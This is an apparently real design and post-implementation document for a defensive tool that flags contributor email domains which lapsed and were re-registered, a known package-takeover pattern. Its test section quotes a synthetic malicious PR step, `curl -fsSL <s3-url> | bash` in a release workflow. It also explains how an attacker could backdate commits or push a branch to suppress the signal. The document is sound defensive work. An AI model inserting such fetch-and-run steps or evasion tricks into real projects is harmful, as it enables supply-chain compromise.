# Domain provenance: RDAP + CT clients and the ownership-discontinuity verdict

Status: **implemented**. See "As built" at the end of this document for the six
places where measurement forced a change to the plan below. The plan text is kept
as written so the deltas stay legible.

## What this detects

Whether a domain backing a contributor's identity **changed hands since that identity
started using it**. Drop-and-re-register resets a domain's RDAP registration date;
renewal and voluntary registrar transfer do not. So a contributor whose attested use of
`example.net` predates that domain's current registration is evidence the domain lapsed
and was reacquired — the `node-ipc` (2026) and PyPI `ctx` (2022) pattern.

The comparison is between two timelines that should never cross:

- `held_since` — when the current registration began.
- `used_since` — earliest date we can attest this identity already used the domain.

`used_since < held_since` means a discontinuity.

### Non-goals

- **Not a merge gate.** Output is reviewer context with a confidence band. No pass/fail.
- **Not a domain-availability scanner.** A contributor's domain is registered by
  definition; availability is the wrong question at PR time.
- **Does not detect cooperative transfer.** A domain sold without lapsing keeps its
  creation date and produces no signal. PyPI's own monitoring has the same hole and
  documents it; we document it too rather than implying coverage.
- **No 2FA inference.** Not exposed for external accounts, and near-universally true
  since GitHub's 2023–24 mandate, so it carries no discriminating information.

## Placement

New top-level package `sift/provenance/`, deliberately outside `sift/runtime/`: it makes
no model calls, needs no `ANTHROPIC_API_KEY`, and is fully deterministic given a fixture
cache. Keeping it out of `runtime/` prevents the LLM pipeline from becoming a dependency
of a check that must be able to run without one.

```
sift/provenance/
  __init__.py        # public surface: assess_identity(), assess_domain()
  names.py           # domain validation + registrable-domain extraction
  rdap.py            # IANA bootstrap + RDAP fetch + event/status parsing
  ct.py              # crt.sh issuance history; Wayback CDX corroboration
  identity.py        # used_since anchors (GPG UIDs, GH Archive, commit history)
  verdict.py         # dataclasses + the decision function
  http_cache.py      # single egress chokepoint, replayable from fixtures
sift/cli/domain_provenance.py    # `sift-domain` entrypoint
sift/render/provenance_summary.py # redacted markdown / check-run output
```

### Dependencies

This module takes runtime dependencies, unlike the rest of the project. They go in an
**optional extra**, not `[project.dependencies]`, so the LLM pipeline stays installable
standalone:

```toml
[project.optional-dependencies]
provenance = ["httpx", "tldextract", "idna", "python-dateutil", "PGPy", "dnspython"]
```

Installed with `uv pip install -e '.[provenance]'`.

| Dependency | Used for | Replaces |
|---|---|---|
| `httpx` | RDAP/CT/Wayback fetches, timeouts, retries, connection reuse | hand-rolled `urllib` retry logic |
| `tldextract` | registrable-domain extraction, PSL-backed with its own snapshot | bundling and refreshing a trimmed PSL |
| `idna` | IDNA 2008 encoding (`str.encode("idna")` is 2003 and mishandles some labels) | stdlib codec |
| `python-dateutil` | RDAP `eventDate` parsing; real-world formats vary by registry | bespoke tolerant date parser |
| `PGPy` | OpenPGP packet parsing for GPG key UIDs and creation timestamps | hand-parsing packet headers |
| `dnspython` | current-state MX/NS lookups | shelling out to `dig` |

`PGPy` is the least certain of these — maintenance is intermittent and it is strict about
malformed keys. Fallback is `gpg --list-packets` as a subprocess, which is available on
GitHub's runners; decide at Phase 3 based on how many real `.gpg` responses it chokes on.

#### What the extra costs

Four places have to handle the dependencies being absent:

1. **No import of `sift.provenance` from `sift/runtime/` or `sift/render/` at module
   scope.** This is the invariant the extra buys, and the easiest one to break by accident.
   The dependency direction is one-way: `provenance` may read `runtime/types.py`, never the
   reverse. Worth a test that imports every `runtime` module with the extra uninstalled.
2. **`sift-domain` needs an import guard.** `pyproject.toml` `[project.scripts]` entries
   are always installed, so a base-install user can invoke `sift-domain` and will otherwise
   get a raw `ModuleNotFoundError`. Keep `cli/domain_provenance.py` free of top-level
   third-party imports; import inside `main()`, catch `ImportError`, and exit non-zero with
   "install `sift[provenance]`".
3. **CI gets a second install path** — one base job asserting the pipeline still imports
   and runs, one `.[provenance]` job for the provenance tests.
4. **`action/action.yml` installs `.[provenance]`.** Check whether the composite action
   currently does a bare `uv pip install -e .`; if so it needs the extra, or the check
   silently no-ops in production while passing locally.

Test collection also needs care: provenance fixtures must skip rather than error under a
base install. Since `tests/` runs without a pytest dependency, that means an explicit
import check at the top of each provenance fixture, not `pytest.importorskip`.

Note that `sift/CLAUDE.md` currently documents the project as stdlib-only. Update it when
this lands — both the constraint and the new `.[provenance]` install command — so a future
contributor doesn't re-apply the old rule.

## Data model (`verdict.py`)

Frozen dataclasses, consistent with `runtime/types.py` style. All timestamps are UTC
ISO-8601 strings at the boundary, `datetime` internally.

```python
@dataclass(frozen=True)
class DomainRegistration:      # from rdap.py
    domain: str
    registered_at: datetime | None    # None = registry publishes no creation date
    expires_at: datetime | None
    statuses: tuple[str, ...]         # e.g. ("redemptionPeriod",)
    rdap_server: str
    source: str                       # "live" | "fixture"

@dataclass(frozen=True)
class UseAnchor:                # from identity.py
    domain: str
    first_seen: datetime
    kind: str                   # "gpg_uid" | "gharchive_push" | "commit_author_date"
    strength: str               # "strong" | "medium" | "weak"
    evidence: str               # key fingerprint, GH Archive file + event id, or sha

@dataclass(frozen=True)
class Discontinuity:            # from ct.py
    start: datetime | None      # last observation of the prior regime
    end: datetime | None        # first observation of the current regime
    kind: str                   # "ct_issuer_change" | "ct_gap" | "wayback_parking"

@dataclass(frozen=True)
class GapActivity:              # from identity.py — the dormancy discriminator
    gap_start: datetime         # last date the identity demonstrably held the domain
    gap_end: datetime           # held_since
    commits_in_gap: int         # repo-local authored commits spanning the ownership gap
    same_signing_key: bool      # continuity of GPG key across the gap
    scope: str                  # "repo_local" (v1) | "account_wide" (later)
    verdict: str                # "continuous" | "dormant" | "unknown"

@dataclass(frozen=True)
class DomainVerdict:
    domain: str
    band: str                   # CRITICAL | LIKELY | NOTE | UNKNOWN | CLEAN
    confidence: str             # high | medium | low
    held_since: datetime | None
    used_since: UseAnchor | None
    gap_activity: GapActivity | None
    corroboration: tuple[Discontinuity, ...]
    reasons: tuple[str, ...]    # human-readable, redaction-safe
    prospective: tuple[str, ...] # expiring/redemption notes — private channel only
```

## Phase 1 — `names.py`, input hardening

Domains arrive from commit metadata, which on a PR is **attacker-controlled**. Anything
that reaches a URL must be validated first or the module becomes an SSRF primitive in a
`pull_request_target` job.

1. Reject anything that isn't a plausible DNS name: per-label charset, label ≤ 63,
   total ≤ 253, no leading/trailing dots or hyphens, no embedded userinfo/port/path/
   scheme characters, no IP literals.
2. Normalize to A-labels with `idna.encode(..., uts46=True)`, rejecting on
   `idna.IDNAError`. Homograph inputs must not be able to produce a fetched host that
   differs from the host we logged.
3. Extract the registrable domain with `tldextract` (`suffix` + `domain`), which carries
   its own PSL snapshot. Disable its network refresh in CI for reproducibility and pin
   the snapshot via the lockfile. An empty `suffix` — unknown or absent TLD — yields
   `UNKNOWN`, never a two-label guess.
4. Skip-list, evaluated before any network call: `users.noreply.github.com`, localhost,
   `.local`, `.internal`, `.test`, `.invalid`, `.example`, RFC 2606 names, and known
   mailbox providers (gmail.com, outlook.com, …) which are out of scope by construction.
   Most contributors terminate here and generate zero lookups.
5. Emit URLs only from the validated A-label string, and assert the final URL's host
   equals the expected service host before the request leaves.

## Phase 2 — `rdap.py`

1. **Bootstrap.** Fetch and cache IANA's `https://data.iana.org/rdap/dns.json`, mapping
   TLD to RDAP base URL. Ship a snapshot so an offline run still works; refresh via the
   same `tools/` script pattern as the PSL.
2. **Fetch** `{base}/domain/{name}` via `httpx` with `Accept: application/rdap+json`, a
   short timeout, and `follow_redirects` restricted to the same host.
3. **Parse** `events[]` for `eventAction == "registration"` and `"expiration"`, and
   `status[]` for `redemptionPeriod`, `pendingDelete`, `clientHold`, `serverHold`.
   `dateutil.parser.isoparse` with a fallback to the lenient parser absorbs the
   registry-to-registry `eventDate` variance. Still tolerate mixed-case actions, missing
   arrays, and nested `nameserver` entities by hand. Absent registration date is a
   first-class `None`, not an error — DENIC (`.de`) and a number of ccTLDs don't publish
   one.
4. **Rate limits and failure.** Honor HTTP 429 with `Retry-After`, bounded retries with
   backoff (`httpx` transport-level retries plus an explicit 429 handler), and cap
   concurrency conservatively — registry RDAP servers are not a bulk API. Every failure
   mode maps to a verdict of `UNKNOWN` with a reason string, never to a silent `CLEAN`.
   This is the most important correctness property in the module: an unreachable registry
   must not read as a clean bill of health.
5. Mirror the error-class shape of `GitHubAPIError` in `runtime/pr_social.py` (status
   code, body, retry-after) so failures surface consistently across the project.

## Phase 3 — `identity.py`, anchoring `used_since`

Three sources, ranked by forgeability. **The subject is the account's identity history,
not the PR's commit emails** — an attacker holding the account can set the git author to
anything, including a `noreply` address, so reading only the PR head hands them a
one-line bypass. Divergence between the PR author email and every historical one is a
separate flag, not the input.

- **`strong` — GPG UIDs.** Fetch `https://github.com/{user}.gpg` and read UIDs plus the
  key creation timestamp with `PGPy` (`PGPKey.from_blob`, then `key.userids` and
  `key.created`). A key created in 2015 bearing `x@olddomain.net` attests use in 2015, and
  the timestamp is bound into the fingerprint that appears in years of prior signatures.
  Iterate subkeys and all UIDs, not just the primary. Fail closed to "no anchor" on
  anything unparseable — a key `PGPy` rejects must not become a missing-anchor `CLEAN`.
- **`strong` — GH Archive push events.** Push `created_at` is server-side and not
  attacker-settable, unlike git author dates. `runtime/types.py` already models this
  (`GHArchivePushEvent.gharchive_push_created_at`, `commit_author_email`), and the parent
  tree has GH Archive data, so this is the highest-value anchor available here and should
  be wired to whatever loader `temporal_experiments/` already uses rather than a new one.
- **`weak` — commit author dates** from the GitHub API. Attacker-settable, so: floor
  every anchor at the account's `created_at`, and treat an author date *earlier* than
  account creation as its own anomaly rather than as evidence of long use.

`used_since` is the earliest anchor across sources, carrying the strength of the source
that produced it.

### Reuse, not reinvention

`runtime/case_builder.py` already computes the repo-local version of this. Do not build a
parallel implementation:

- `identity_email_domain()` and `identity_email_is_noreply()` — the same normalization
  `names.py` needs for its skip-list. Import them rather than duplicating.
- `summarize_author_identity_history()` already emits, per author email,
  `email_domain` / `first_seen_at` / `previous_seen_at` / `commit_count`. That *is* the
  weak `used_since` anchor, bounded to repo-local history and already ordered.

So Phase 3's real work is narrower than it first looked: add the two strong anchors (GPG
UIDs, GH Archive) and the gap-activity computation on top of an existing per-domain
first-seen table.

### Gap activity (the dormancy discriminator)

Given a gap between the identity's last demonstrable hold on the domain and `held_since`,
ask whether the identity was *active across that gap*:

- Count commits authored during `[gap_start, gap_end]` **in this repository only**, and
  check whether the GPG signing key is the same before and after. Repo-local is what
  `case_builder.py` already computes and needs no new data source; account-wide would be
  more accurate but requires the GH Archive index (open question 1) and can wait.
- Repo-local scope has a consequence worth stating plainly: a **first-time contributor has
  no repo-local history at all**, so gap activity is `unknown` by construction and can
  never reach `dormant`. Their band therefore caps at `LIKELY` (corroborated) or `NOTE`.
  That is the correct outcome — with no history in this repo there is no continuity claim
  to break — but it means the discriminator does no work on exactly the population a
  reviewer is least sure about, and account-wide scope is what would fix it.
- **`continuous`** — the identity kept committing through the period the domain was out of
  its hands, signing with the same key. The person was demonstrably still the person, so
  the discontinuity is a self-rebuy. Strongly benign.
- **`dormant`** — activity stopped before the gap and resumed after it. This is the
  takeover shape, and it does not become safe with age.
- **`unknown`** — insufficient history to tell.

This replaces time-since-registration as the primary discriminator. Recency was only ever
a proxy for dormancy, and a poor one: it suppresses the patient-attacker case by
construction (a domain acquired and sat on for a year), while flagging the very common
benign case of a maintainer who let their own domain lapse years ago.

## Phase 4 — `ct.py`, corroboration only

Free stand-in for the passive-DNS approach in Lever et al.'s Alembic. Never fires an
alert alone; it moves confidence and covers registries that publish no creation date.

- **crt.sh** JSON issuance history. Signature of a drop: a run of certificates, a gap,
  then certificates from a different issuer with different SANs. Emit
  `ct_issuer_change` / `ct_gap` with the gap bounds.
- **Wayback CDX** content history. A parking-page interval between two content regimes is
  the classic drop signature; emit `wayback_parking`.
- Both are best-effort. Timeouts and empty results are normal (a domain that never used
  TLS or was never archived) and must lower confidence rather than produce a finding.

## Phase 5 — `verdict.py`, the decision function

```python
def assess_domain(domain, anchors, *, now, registration, corroboration) -> DomainVerdict
def assess_identity(identity, *, now, ...) -> tuple[DomainVerdict, ...]
```

`now` is an injected parameter, never `datetime.now()` inside the function — fixtures
replay historical incidents against a pinned clock.

Band logic:

All rows below presume a discontinuity, i.e. `used_since < held_since - TOLERANCE`. The
discriminator is `gap_activity.verdict`, not elapsed time.

| Condition | Band |
|---|---|
| `dormant` across the gap, CT/Wayback corroborates | `CRITICAL` |
| `dormant`, no corroboration | `LIKELY` |
| `unknown` gap activity | `LIKELY` if corroborated, else `NOTE` |
| `continuous` across the gap with same signing key | `NOTE` |
| No registration date; corroborated gap postdating `used_since` | `UNKNOWN` + low-confidence anomaly note |
| No registration date; nothing else | `UNKNOWN` |
| No discontinuity | `CLEAN` |

Recency still enters, but only as a confidence modifier and a reason string ("acquired 9
days ago") — never as the thing that decides the band.

`TOLERANCE` (a couple of weeks) absorbs clock skew and same-day rebuys. Anchor strength
caps confidence — a `weak`-only anchor can never reach `high`, and a `continuous` gap
verdict derived only from attacker-settable author dates should not be trusted to clear a
discontinuity on its own.

`prospective` collects expiry and `redemptionPeriod`/`pendingDelete` findings. These are
about a *trusted* person's future risk, not an untrusted PR's past, and publishing them
in a PR thread is an attack roadmap plus an unnecessary disclosure of someone's personal
domain. They route to maintainers and the contributor privately, never to public output.

## Phase 6 — `http_cache.py`

Single chokepoint for all egress, implemented as a custom `httpx.BaseTransport` wrapping
the default one — that way no caller can bypass it by constructing its own client, and the
same object serves as both production cache and test fixture store. Keyed by SHA-256 of
the request URL, storing `{url, fetched_at, status, headers_subset, body}` under
`tests/fixtures/provenance/`.
Three modes via env var, mirroring the existing level-1/level-2 convention:

- default — replay only; a cache miss raises, so level-1 tests are free, offline, and
  deterministic.
- `SIFT_FIXTURE_LIVE=1` — live fetch with record-on-miss.
- refresh — force re-record, for deliberately updating snapshots.

## Phase 7 — fixtures and tests

Follow `tests/test_asyncapi_patch_budget.py`: directly runnable, pytest-compatible, no
pytest dependency.

Known positives (recorded, replayed against a pinned `now`):

- **`node-ipc` / `atlantis-software.net`** — reported expiry 2025-01-10, re-registration
  2026-05-07, malicious publishes 2026-05-14. Should land `CRITICAL`.
- **PyPI `ctx` / `figlief.com`** — reported re-registration 2022-05-14T18:40:05Z, password
  reset 12 minutes later. Should land `CRITICAL` against a 2022 clock.

Both incidents are treated as verified; pin the dates above as assertions directly. Note
that live RDAP today will show whatever the current state is — `figlief.com` may well have
lapsed again since — which is why these fixtures are recorded snapshots replayed against a
pinned `now`, not live lookups.

Known negatives and edge cases: a long-stable domain (`CLEAN`); a `.de` domain (no
creation date, `UNKNOWN`, must not alarm); a `noreply`-only contributor (skipped before
any network call, and explicitly reported as "nothing measurable", not "clean"); a
mailbox-provider address (skipped); malformed and hostile domain strings (rejected by
`names.py` with no egress — assert zero cache lookups).

## Phase 8 — the prior: feeding `primary.py` instead of commenting

A `DomainVerdict` is not a finding. On its own, "this contributor's email domain changed
hands" is unactionable for a reviewer looking at a diff, and shipping it as a standalone PR
comment is how the check gets muted — which takes `CRITICAL` down with it, since muting is
not band-selective. Instead the verdict enters the case as **evidence**, and the existing
triage model decides whether it matters *for this diff*. "Possible identity discontinuity"
plus "this PR touches release tooling" is a strong signal; the same discontinuity plus a
docs typo fix is noise, and only the model sees both.

This fits the pipeline's existing design rather than bolting onto it. `primary.py` already
carries the right doctrine — *"Maintainer-behavior deviation is supporting evidence, not
sole proof. Treat it as strong only when it is coupled with sensitive changes, unusual
paths, thin prior history, or other concrete risk signals"* — and the provenance verdict is
exactly that class of evidence.

1. **`case_builder.py`** attaches a `domain_provenance` block under
   `history_before_commit.author_identity_history`, keyed by email domain, alongside the
   `first_seen_at` data it already emits. Redaction-safe fields only: band, confidence,
   gap-activity verdict, days-since-acquisition. Never the raw RDAP body.
2. **`primary.py`** adds `history_before_commit.author_identity_history.domain_provenance`
   to `allowed_refs` so findings can cite it, plus one prompt rule in the register of the
   existing ones: a discontinuity is supporting evidence for an identity-related finding,
   never sole proof, and a `continuous` gap verdict is affirmative evidence *against*
   takeover.
3. **Reconcile the existing guardrail.** `primary.py` currently instructs the model not to
   *"infer role changes, account takeover, or broader GitHub-ecosystem behavior unless the
   evidence shown actually supports that claim."* Provenance evidence is precisely what
   would license that inference, so that rule needs a companion clause naming
   `domain_provenance` as evidence that can support it — otherwise the two instructions
   conflict and the model will most likely obey the older, more specific prohibition.
4. **Failure semantics.** An `UNKNOWN` verdict, or the extra not being installed, must
   render as an absent evidence section, never as a `CLEAN` one. A model told "provenance:
   clean" when the lookup actually failed is worse than a model told nothing.
5. **Emit `CLEAN` and `continuous` verdicts as counter-evidence, not silence.** A domain
   held continuously since before the identity first used it, or a discontinuity the
   identity demonstrably committed across with the same signing key, is affirmative
   evidence *against* an identity-related finding. The model should be able to cite it to
   close a weak suspicion rather than having to reason from an absent section. This makes
   the three states — supporting, counter, and unavailable — distinguishable in the case,
   which is the same distinction step 4 requires and the reason not to suppress benign
   results for case-size reasons.
6. **Fixture consequence.** The two incident fixtures now have a second assertion level:
   the verdict band (deterministic, level-1) and whether the finding severity shifts with
   the prior present versus absent (needs a live model, so level-2 behind
   `SIFT_FIXTURE_LIVE=1`). Keep the A/B comparison — the prior's value is the delta, and
   without measuring it there's no evidence the evidence helps.

Standalone rendering stays available via `sift-domain` and the scheduled variant, where the
audience is a maintainer auditing identities rather than reviewing a diff, and where the
`NOTE` band is worth reading.

## Phase 9 — integration

- **CLI** `sift-domain` in `pyproject.toml` `[project.scripts]`, accepting a GitHub
  username or an `event.json` path, emitting JSON or the redacted markdown.
- **Action.** Runs inside the existing `pull_request_target` job. That trigger is safe
  here for the same reason it's safe today — PR code is never checked out or executed —
  and this module must preserve the invariant: PR-controlled data enters only as
  validated domain strings, and only after `names.py`. No `GITHUB_TOKEN` write scope and
  no secrets are needed beyond what the action already has.
- **Render** `render/provenance_summary.py` emits band, confidence, and reasons with the
  domain and email **redacted** from any public surface; full detail goes to the job
  summary. Same check-run payload shape as `render/github_check.py`.
- **Scheduled variant.** The same engine over the repo's own committers and CODEOWNERS is
  where the base rate is high enough to be worth reading regularly. Worth building
  second, but the module boundary should not assume the PR trigger.

## Open questions

1. Does the GH Archive loader in `temporal_experiments/` expose a
   `(email → earliest push)` index, or does this need one built? That determines whether
   the strong anchor is available on day one or is Phase 3b.
2. `PGPy` versus a `gpg --list-packets` subprocess for UID parsing — decide empirically
   against a sample of real `.gpg` responses (see Phase 3).
3. crt.sh has no stability guarantee and rate-limits aggressively. If it proves flaky,
   the fallback is a CT log API directly, at the cost of more parsing.
4. Whether the counter-evidence section should also appear when the contributor was
   skipped by `names.py` (noreply, mailbox provider). It is a *third* kind of
   unavailability — measurement was declined, not attempted and failed — and conflating it
   with `UNKNOWN` would let "uses a noreply address" read as a lookup failure.

---

## As built

Six things changed once the code met real data. Each is a finding, not a
convenience.

### 1. PGPy is unusable; `gpg --list-packets` is better anyway

PGPy 0.6.0 imports `imghdr`, removed from the stdlib in Python 3.13 by PEP 594, so
it cannot be imported at all on current Python. The fallback became the primary
path — and it is strictly better: `gpg --list-packets` exposes each UID's own
binding-signature date, so `di@python.org` (bound 2018) is distinguishable from the
same key's 2015 creation. That gives a **per-domain** first-use date where a
library's key-wide `created` field would have given one date for every UID. PGPy
was dropped from the extra.

### 2. Corroboration cannot gate the band

Measured against both incident domains: `atlantis-software.net` returns a genuine
empty Certificate Transparency result (`[]` on repeated successful calls), and
neither it nor `figlief.com` has an archived capture after its re-registration —
Wayback's last capture for `atlantis-software.net` is 2025-07-16, ten months before
the 2026-05-07 re-registration. Abandoned single-maintainer domains, the exact
profile this attack targets, tend never to have held a TLS certificate and are
crawled only sporadically. (See change 4 for what could and could not be
established about `figlief.com`'s CT history, and why.)

The plan had `CRITICAL` require corroboration. That would have made the true-positive
shape unreachable: the real `node-ipc` case would cap at `LIKELY` forever. Corroboration
is now a confidence modifier only (`high` when present, `medium` when not), and what
gates `CRITICAL` instead is **anchor strength** — a discontinuity established solely
from attacker-settable commit author dates caps at `LIKELY`.

### 3. Raw archive gaps are noise; they must bracket a known event

Sparse Internet Archive crawling gave `atlantis-software.net` sixteen 90-day-plus
"discontinuities" across its history, none of them ownership changes. Since
corroboration raised the band at the time, that noise manufactured false criticals.
Two fixes: a Wayback gap now also requires the content digest to change across it,
and a discontinuity counts only when it **brackets** the RDAP registration date.
Corroboration confirms an event RDAP already found; it does not discover events.

Also fixed: the crt.sh query originally passed `exclude=expired`, which filtered out
exactly the prior owner's certificates that establish the earlier regime.

### 4. crt.sh answers roughly one request in three, and that must not fail a run

Measured across repeated probes of the same URL: HTTP 200, HTTP 502, HTTP 404, and
30-second read timeouts, in no particular order. It is not the User-Agent — plain
httpx, a curl UA, and our own UA all drew both successes and timeouts within
seconds of each other. `python.org` returned 1.4 MB of certificates on a successful
call, so the service works; it just frequently declines to.

Because CT and Wayback can only lower confidence, an unreachable service and an
unrecorded fixture are both treated as "no corroboration available". RDAP
deliberately does *not* get this treatment: there a missing answer is load-bearing
and surfaces as `UNKNOWN`.

The practical consequence is that CT corroboration will be absent most of the time
even for domains that do have certificates, which reinforces change 2 rather than
sitting beside it. If corroboration ever needs to be load-bearing, crt.sh is not a
sufficient source and a CT log API would have to replace it.

**A correction worth recording**, because it nearly went into this document
unchecked: the first draft of change 2 claimed both incident domains "return zero CT
entries," citing recorded fixtures. Those fixtures held a 502 and a 404 — service
errors, which are not evidence of absence. The claim survived re-checking only for
`atlantis-software.net`, which returns a genuine empty array `[]` on multiple
successful calls. Fixtures that record an error response are actively misleading and
were deleted rather than kept.

### 5. The renderer had to move, and `verifier.py` is the real render path

`sift/render/provenance_summary.py` would have broken the base install: importing
`sift.provenance.verdict` executes `sift/provenance/__init__.py`, which needs httpx.
It now lives at `sift/provenance/render.py`, keeping `sift/render/` stdlib-only.

More consequential: the prior was first wired into
`case_builder.render_agent_prompt`, which is the *agentic* renderer. `primary.py` and
every verifier variant read `verifier.render_verifier_evidence` instead, so the
evidence ref pointed at a field the model never saw — the silent no-op this plan
warned about, reproduced exactly. The A/B fixture caught it; a wiring-only assertion
would not have.

### 6. GH Archive anchors are not wired

Open question 1 resolved: no general `(email -> earliest push)` index exists here.
`case_builder.build_gharchive_context` is keyed on a `GroundTruthCommit` and an event
lookup built for replaying specific incidents. `identity.gharchive_anchor` documents
the shape and accepts an index, returning `None` until one is built. Consequence:
the strongest available anchor today is the GPG UID, and identities without a
published key fall back to `weak` repo-local author dates — which, per change 2, can
no longer reach `CRITICAL`. Building that index is the single highest-value follow-up.

### Measured A/B result

Live against `claude-opus-4-6`, same synthetic commit (a change rewriting the npm
publish registry in a release workflow), prior present versus absent:

| | classification | findings | severities | cites provenance |
|---|---|---|---|---|
| without prior | suspicious | 2 | high, medium | no |
| with prior | suspicious | 3 | high, high, medium | yes |

The prior adds a finding, raises the severity ceiling, and gets cited. Re-run with
`SIFT_FIXTURE_LIVE=1 ANTHROPIC_API_KEY=... python tests/test_domain_provenance_prior.py`.

### 7. Three wiring defects the fixtures could not see

Found by running the pipeline against a real repository (`endee-io/endee`, 95
commits) with a synthetic committer, rather than by constructing `UseAnchor`s in a
test. Every fixture passed while all three were live, because the fixtures enter at
`assess_domain` and the defects were all upstream of it, in
`case_builder` history -> anchor -> `gap_activity`. Pinned by
`tests/test_provenance_pipeline_anchors.py`, which fails on each.

1. **The single-address contributor had no anchor at all.**
   `anchors_from_identity_history` read only `author_email_variants`, which holds
   the *alternate* addresses a contributor has used. Someone who has always used
   one address has an empty list; their earliest date is in the flat
   `author_email_first_seen_at` field. So the common case — and the one this check
   exists for — produced no anchor and therefore a permanent `UNKNOWN`, whatever
   RDAP said.

2. **The anchoring commit counted as activity inside its own gap.** The gap window
   opens at `anchor.first_seen`, and `git log --since` is inclusive, so the very
   commit that established the anchor fell inside the window it defined. Any
   repo-local anchor therefore read `CONTINUOUS`, and a real takeover was reported
   as **counter-evidence** — the worst available direction for this check to fail.
   `dormant` was unreachable by this path. The window now opens strictly after the
   anchor.

3. **The gap test silently never ran when an anchor existed.** `assess_identity`
   seeds candidate domains from anchors with an empty email, and the subsequent
   `setdefault` could not overwrite it, so `author_email` stayed empty and
   `assess_domain_provenance` skipped `gap_activity` — which needs an address for
   `git log --author`. The dormant-vs-continuous discriminator, the thing that
   separates `NOTE` from `CRITICAL`, did no work precisely whenever an anchor was
   available.

The shared lesson is that all three were *wiring*, not logic, and all three failed
toward silence or toward counter-evidence rather than toward a false alarm. A
fixture suite that constructs its own inputs cannot see this class of defect; only
an end-to-end run against real history can.

### 8. The fixture cache was the production default, so the check never ran

The first real Actions run (endee mirror, PR #1) came back with the triage model
told *"domain provenance is unavailable"* for a domain whose RDAP record resolves
fine. Cause: `http_cache.current_mode()` returned **replay** whenever
`SIFT_FIXTURE_LIVE` was unset -- which is every production run. The first RDAP
request raised `CacheMiss`, `build_domain_provenance_evidence` caught it as a
generic lookup failure, and the evidence degraded to `unavailable`. The check had
never worked outside the test suite.

This is the same failure mode as change 5, one layer down, and it survived the
same way: the fixtures pass *because* replay is their default, so nothing in the
suite could distinguish "replays correctly" from "only ever replays". The action's
own comment warned about silently no-opping in production while passing locally,
and it happened anyway in the one place nobody was looking.

Fixed by inverting the default: live is what an unconfigured run does, and
`SIFT_FIXTURE_REPLAY=1` is an explicit opt-in that the fixtures now set for
themselves. A test harness must never be the default path for shipped code.
`tests/test_provenance_pipeline_anchors.py` pins the default.

Worth noting what this cost: everything upstream of it was already correct, and a
single unset environment variable was enough to make the entire feature invisible
while every test was green.

### 9. First end-to-end production result

endee mirror, PR #1: a synthetic identity (`testdev@launchxlabs.ai`) with one
backdated commit predating its domain's current registration, opening a PR that
adds `curl -fsSL <s3-url> | bash` to the beta Docker release workflow. Sift ran as
the composite action under `pull_request_target`, with `domain_provenance: detail`.

| | with the prior broken (run 1) | with the prior working (run 3) |
|---|---|---|
| provenance verdict | `unavailable` (CacheMiss) | `LIKELY` / `dormant` / `supporting` |
| identity finding | `high`, "domain provenance is unavailable" | `high`, cites the 2023-03-11 vs 2024-03-08 discontinuity by date |
| findings | 4 | 4 |
| classification | suspicious | suspicious |

The finding count did not move, which is the honest read: the `curl | bash` was
independently damning and the case was already `suspicious` without provenance. What
changed is the *content* of the identity finding -- from "we could not check" to a
dated, specific ownership-discontinuity claim naming the takeover shape. That is the
form in which this evidence is meant to be useful, and it matches the earlier
synthetic A/B rather than exceeding it.

Also observed, unrelated to provenance: run 3's verifier corrected a factual error
run 1 had let through. Run 1 asserted the injected step ran "before secrets are
loaded"; run 3 correctly noted that all secrets are available to every step via the
`secrets` context regardless of step order.

One defect this surfaced but did not fix: the standalone `sift-domain` action step
keys on the PR author's *GitHub login* (`--event-path`), so it assessed the account
that opened the PR (`eharris128`) rather than the commit author email, and reported
"No candidate domains". The in-case evidence hook, which reads `commit_payload`, was
correct throughout. The standalone rendering path needs the commit emails passed too.

### 10. The shape space, pinned as a table

`tests/test_provenance_scenarios.py` asserts the ladder as
(shape -> expected band/role) rather than as prose, so a change to `assess_domain`
surfaces as a diff in a table. Fifteen rows across anchor strength, gap verdict,
corroboration, registry answer, and input handling.

Two results worth stating outright, because neither had been demonstrated before:

- **CRITICAL is reachable, and only one way.** Strong (GPG) anchor plus a dormant
  gap. Verified against a real key generated with `gpg --faked-system-time`, so the
  test exercises `parse_gpg_packets` on genuine packet output and confirms the
  *per-UID binding date* is what gets read. Every other shape caps lower: weak
  anchor plus dormant is LIKELY, an untestable gap is NOTE, and anything
  continuous is NOTE/counter.
- **An untestable gap costs two rungs.** A strong anchor with a real discontinuity
  lands at NOTE when there is no repo-local history to test dormancy against. The
  mechanism was already documented; the size of the drop was not.

The table has teeth: removing the weak-anchor cap and making corroboration gate the
band were both introduced as mutations, and each was caught -- the second by the
assertion written specifically for it.

One row documents a **known gap rather than desired behaviour**: dormant plus an
unchanged signing key still reads CRITICAL, though it is the benign self-rebuy
shape (a domain takeover does not convey the private key). It is deliberately not
fixed, because `%GK` reports a *claimed* issuer key id whether or not the signature
verifies -- `%G?` is `E` whenever the public key is absent from the keyring, which
on a CI runner it always is. Downgrading a band on key continuity today would be an
attacker-settable suppression primitive, the same failure shape as the `--all`
issue. Verify the signature first, then change the ladder, then invert that test.

### Remaining open questions

1. **`gap_activity` scans `--all`, which includes attacker-pushable refs.**
   `_git_log_window` and `_commits_outside` pass `--all`, so the gap test counts
   commits on *any* ref in the repository rather than on the history under review.
   **Confirmed in production**, not just locally. On the endee mirror, PR #1 with
   an unrelated second branch (`sift-test-continuous`) present in the repo returned
   `counter` / `NOTE` / `continuous`, 3 commits across the gap. Deleting that branch
   and re-running the identical PR returned `supporting` / `LIKELY` / `dormant`,
   0 commits. Same PR, same commits, same domain -- the only difference was a branch
   the PR does not touch.
   Under `pull_request_target` the PR head is fetched into the analysis repo, so a
   contributor who can push a branch can manufacture the commits that suppress
   their own discontinuity signal. Counter-evidence sourced from attacker-writable
   refs is worse than no counter-evidence. Not fixed here because the correct scope
   is a decision — the observed ref, the default branch, or refs excluding the PR
   head — and it needs threading through `assess_identity`. Highest-priority
   follow-up alongside the GH Archive index.
2. Build the GH Archive `(email -> earliest push)` index, which would restore a
   strong anchor for identities with no published GPG key and enable account-wide
   gap scope.
3. Whether the `.io` and `.me` ccTLDs (and others like them) deserve a documented
   coverage note: IANA's live RDAP bootstrap publishes **no service** for either, so
   every domain under them is a structural `UNKNOWN`, not a lookup failure. Measured
   against `endee.io` and `dwivedi.me`. The bundled snapshot is not stale — it
   matches `data.iana.org/rdap/dns.json` exactly; the registries simply never
   deployed RDAP. This silently exempts a popular slice of developer-vanity domains
   from the check.
4. Whether `declined` (nothing measurable) deserves its own evidence role in the
   case rather than sharing rendering with `unavailable`. Both are currently marked
   "NOT a clean result", which is the property that matters, but they are different
   facts.
5. Whether the scheduled variant over a repo's own committers and CODEOWNERS should
   share the PR-time band ladder or use a lower threshold, given that its audience is
   auditing rather than reviewing.
